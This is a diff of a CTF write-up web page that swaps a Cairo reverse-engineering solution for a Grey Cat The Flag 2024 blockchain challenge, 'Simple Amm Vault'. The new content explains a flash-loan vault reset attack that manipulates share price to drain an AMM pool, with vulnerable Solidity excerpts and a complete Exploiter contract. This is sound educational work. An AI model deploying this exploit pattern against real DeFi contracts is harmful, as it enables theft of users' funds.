@@ -6,20 +6,20 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="2022 | BalsnCTF | smart contract">
+        <meta name="description" content="2024 | Grey Cat The Flag | Blockchain">
       
       
         <meta name="author" content="YanhuiJessica">
       
       
-        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/cairo_reverse/">
+        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/simple_amm_vault/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-8.3.3">
     
     
       
-        <title>Blockchain - Cairo Reverse - Chictf-Writeups</title>
+        <title>Blockchain - Simple Amm Vault - Chictf-Writeups</title>
       
     
     
@@ -80,7 +80,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#_1" class="md-skip">
+        <a href="#description" class="md-skip">
           跳转至
         </a>
       
@@ -113,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Blockchain - Cairo Reverse
+              Blockchain - Simple Amm Vault
             
           </span>
         </div>
@@ -2166,68 +2166,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          Cairo Reverse
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../cairo_reverse/" class="md-nav__link">
         Cairo Reverse
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    题目
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    解题思路
-  </a>
-  
-    <nav class="md-nav" aria-label="解题思路">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#flag" class="md-nav__link">
-    Flag
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -2916,12 +2859,14 @@
               
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_24" type="checkbox" id="__nav_7_24" >
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_24" type="checkbox" id="__nav_7_24" checked>
       
       
       
@@ -2970,11 +2915,75 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../simple_amm_vault/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Simple Amm Vault
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Simple Amm Vault
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    Description
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    Solution
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    Exploitation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -3615,19 +3624,26 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    题目
+  <a href="#description" class="md-nav__link">
+    Description
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    解题思路
+  <a href="#solution" class="md-nav__link">
+    Solution
   </a>
   
-    <nav class="md-nav" aria-label="解题思路">
+    <nav class="md-nav" aria-label="Solution">
       <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    Exploitation
+  </a>
+  
+</li>
         
           <li class="md-nav__item">
   <a href="#flag" class="md-nav__link">
@@ -3655,25 +3671,29 @@
   
   <div style="color: gray;">
     <small>
-      2022 | BalsnCTF | smart contract
+      2024 | Grey Cat The Flag | Blockchain
     </small>
   </div>
   
 
   
                 
-  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/cairo_reverse.md" title="编辑此页" class="md-content__button md-icon">
+  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/simple_amm_vault.md" title="编辑此页" class="md-content__button md-icon">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
   </a>
 
 
 
-  <h1>Cairo Reverse</h1>
+  <h1>Simple Amm Vault</h1>
 
 <div class="md-typeset">
     <div class="blogging-tags-grid">
 
-        <a href="#reverse" class="blogging-tag"><code>#reverse</code></a>
+        <a href="#smart contract" class="blogging-tag"><code>#smart contract</code></a>
+
+        <a href="#vault reset attack" class="blogging-tag"><code>#vault reset attack</code></a>
+
+        <a href="#flashloan" class="blogging-tag"><code>#flashloan</code></a>
 
     </div>
 
@@ -3700,70 +3720,119 @@
         border-radius: 5px;
     }
 </style>
-<h2 id="_1">题目<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<p>Simple cairo reverse</p>
-<p>starknet-compile 0.9.1</p>
-<p><a href="../static/cairo_reverse.zip"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 20h14v-2H5m14-9h-4V3H9v6H5l7 7 7-7Z"/></svg></span> <code>cairo_reverse.zip</code></a></p>
-<h2 id="_2">解题思路<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="description">Description<a class="headerlink" href="#description" title="Permanent link">&para;</a></h2>
+<p>ERC-4626 was too complex, so I made an AMM to swap between shares and assets.</p>
+<blockquote>
+<p>nc challs.nusgreyhats.org 30301</p>
+<p><a href="https://github.com/MiloTruck/evm-ctf-challenges/tree/8763f5fd12c3179227ec9cac0b21b959c6144dca/src/simple-amm-vault">Challenge Files</a></p>
+</blockquote>
+<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h2>
 <ul>
-<li><code>get_flag</code> 需要知道 <code>t</code> 的值，试图直接在 <code>contract_compiled.json</code> 找 <code>t</code> 来获得对应值无果</li>
-<li><a href="https://www.cairo-lang.org/playground/">Cairo Playground</a> 可以进行编译调试，发现 <code>Memory</code> 部分与 <code>contract_compiled.json</code> 中 <code>program</code> 的 <code>data</code> 部分高度相似</li>
+<li>Initially, there are 1000 GREY deposited in the vault, 1000 GREY sent to the vault as rewards, and 2000 GREY in the pool. The player starts with 1000 GREY and need to have at least 3000 GREY to solve the challenge</li>
 <li>
-<p>替换 <code>CENSORED</code> 部分为任意值，使用 Playground 调试 <code>get_flag</code>，可知 <code>0x800000000000010fffffffffffffffffffffffffffe2919e3d696087d12173e</code> 对应 <code>t</code> 的负值</p>
-<div class="highlight"><pre><span></span><code>%builtins output
+<p>Users can receive distributed rewards by unstaking GREY. Since the pool offers zero-fee flash loans on GREY and SV tokens, we can borrow SV and withdraw all the GREY from the vault. The <code>totalAssets</code> and <code>totalSupply</code> will then return to zero, causing the share price to drop, then we can deposit 1000 GREY and repay the flash loan</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">assets</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">shares</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">shares</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">toSharesDown</span><span class="p">(</span><span class="nx">assets</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">shares</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;zero shares&quot;</span><span class="p">);</span>
 
-func get_flag{}(t:felt) -&gt; (res : felt):
-    if t == 1234:
-        return (res=0x42414c534e7b6f032fa620b5c520ff47733c3723ebc79890c26af4 + t*t)
-    else:
-        return(res=0)
-    end
-end
+<span class="w">    </span><span class="nx">totalAssets</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">assets</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">shares</span><span class="p">);</span>
 
-func main{output_ptr : felt*}():
-    get_flag(4321)
-    return ()
-end
-</code></pre></div>
-<p><img alt="debugging" src="../img/cairo_reverse01.jpg" /></p>
-</li>
-<li>
-<p>Cairo 中整型的范围在 <span class="arithmatex">\([0, P)\)</span>，其中 <span class="arithmatex">\(P\)</span> 为素数，标准值为 <span class="arithmatex">\(2^{251}+17\cdot 2^{192} + 1\)</span><sup id="fnref:1"><a class="footnote-ref" href="#fn:1">1</a></sup></p>
-</li>
-<li>
-<p>通过模 <span class="arithmatex">\(P\)</span> 来求 <code>t</code></p>
-<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">base</span> <span class="o">=</span> <span class="mh">0x42414c534e7b6f032fa620b5c520ff47733c3723ebc79890c26af4</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">P</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">**</span> <span class="mi">251</span> <span class="o">+</span> <span class="mi">17</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">**</span> <span class="mi">192</span> <span class="o">+</span> <span class="mi">1</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">mt</span> <span class="o">=</span> <span class="mh">0x800000000000010fffffffffffffffffffffffffffe2919e3d696087d12173e</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">t</span> <span class="o">=</span> <span class="o">-</span><span class="n">mt</span> <span class="o">%</span> <span class="n">P</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">t</span> <span class="o">*</span> <span class="n">t</span><span class="p">)</span>
-<span class="sa">b</span><span class="s1">&#39;BALSN</span><span class="si">{read_data_from_cairo}</span><span class="s1">&#39;</span>
+<span class="w">    </span><span class="nx">GREY</span><span class="p">.</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">assets</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">toSharesDown</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">assets</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">totalAssets</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">totalSupply</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">assets</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">assets</span><span class="p">.</span><span class="nx">mulDivDown</span><span class="p">(</span><span class="nx">totalSupply</span><span class="p">,</span><span class="w"> </span><span class="nx">totalAssets</span><span class="p">);</span>
+<span class="p">}</span>
 </code></pre></div>
 </li>
 <li>
-<p>当然也可以使用 <a href="https://github.com/FuzzingLabs/thoth">thoth</a> 来 Decompile</p>
+<p>After the flash loan, the share price dropped from 2e18 to 1e18</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">sharePrice</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">totalSupply</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">1e18</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">totalAssets</span><span class="p">.</span><span class="nx">divWadDown</span><span class="p">(</span><span class="nx">totalSupply</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>The pool calculates K based on the share price and the amount of tokens reserved. The initial K is 2000e18 (1000e18 + 2000e18 * 1e18 / 2e18)</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">computeK</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amountX</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amountY</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">price</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">VAULT</span><span class="p">.</span><span class="nx">sharePrice</span><span class="p">();</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">amountX</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">amountY</span><span class="p">.</span><span class="nx">divWadDown</span><span class="p">(</span><span class="nx">price</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>Thus, 1000 GREY can be taken out from the pool without SV after the share price drops (1000e18 + 1000e18 * 1e18 / 1e18 &gt;= 2000e18). Enough GREY is now obtained</p>
+<div class="highlight"><pre><span></span><code><span class="nx">modifier</span><span class="w"> </span><span class="nx">invariant</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">computeK</span><span class="p">(</span><span class="nx">reserveX</span><span class="p">,</span><span class="w"> </span><span class="nx">reserveY</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">k</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;K&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">swap</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">swapXForY</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amountIn</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amountOut</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">invariant</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">IERC20</span><span class="w"> </span><span class="nx">tokenIn</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">IERC20</span><span class="w"> </span><span class="nx">tokenOut</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">swapXForY</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">reserveX</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">amountIn</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">reserveY</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">amountOut</span><span class="p">;</span>
+
+<span class="w">        </span><span class="p">(</span><span class="nx">tokenIn</span><span class="p">,</span><span class="w"> </span><span class="nx">tokenOut</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">tokenX</span><span class="p">,</span><span class="w"> </span><span class="nx">tokenY</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">reserveX</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">amountOut</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">reserveY</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">amountIn</span><span class="p">;</span>
+
+<span class="w">        </span><span class="p">(</span><span class="nx">tokenIn</span><span class="p">,</span><span class="w"> </span><span class="nx">tokenOut</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">tokenY</span><span class="p">,</span><span class="w"> </span><span class="nx">tokenX</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">tokenIn</span><span class="p">.</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">amountIn</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">tokenOut</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amountOut</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
 </li>
 </ul>
+<h3 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Exploiter</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">SimpleVault</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">vault</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">SimpleAMM</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">amm</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">GREY</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">grey</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">Setup</span><span class="w"> </span><span class="nx">setup</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vault</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">setup</span><span class="p">.</span><span class="nx">vault</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">amm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">setup</span><span class="p">.</span><span class="nx">amm</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">grey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">setup</span><span class="p">.</span><span class="nx">grey</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">grey</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">),</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint256</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
+
+<span class="w">        </span><span class="nx">setup</span><span class="p">.</span><span class="nx">claim</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">amm</span><span class="p">.</span><span class="nx">flashLoan</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">amm</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">grey</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">grey</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">onFlashLoan</span><span class="p">(</span><span class="nx">uint256</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">amm</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">vault</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vault</span><span class="p">.</span><span class="nx">deposit</span><span class="p">(</span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vault</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">amm</span><span class="p">),</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
 <h3 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h3>
 <blockquote>
-<p>BALSN{read_data_from_cairo}</p>
+<p>grey{vault_reset_attack_a3e7a42b511cf0a8}</p>
 </blockquote>
-<div class="footnote">
-<hr />
-<ol>
-<li id="fn:1">
-<p><a href="https://www.cairo-lang.org/docs/how_cairo_works/cairo_intro.html?highlight=integer#field-elements">Introduction to Cairo — Field elements</a>&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
-</li>
-</ol>
-</div>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2022年9月11日 15:27:30</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2024年5月1日 18:47:27</span>
       
     
   </small>
@@ -3857,7 +3926,7 @@ end
     <nav class="md-footer__inner md-grid" aria-label="页脚" >
       
         
-        <a href="../totally_secure_dapp/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Totally Secure Dapp" rel="prev">
+        <a href="../escrow/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Escrow" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
           </div>
@@ -3866,20 +3935,20 @@ end
               <span class="md-footer__direction">
                 上一页
               </span>
-              Totally Secure Dapp
+              Escrow
             </div>
           </div>
         </a>
       
       
         
-        <a href="../tctf_nft_market/" class="md-footer__link md-footer__link--next" aria-label="下一页: TCTF NFT Market" rel="next">
+        <a href="../voting_vault/" class="md-footer__link md-footer__link--next" aria-label="下一页: Voting Vault" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 下一页
               </span>
-              TCTF NFT Market
+              Voting Vault
             </div>
           </div>
           <div class="md-footer__button md-icon">
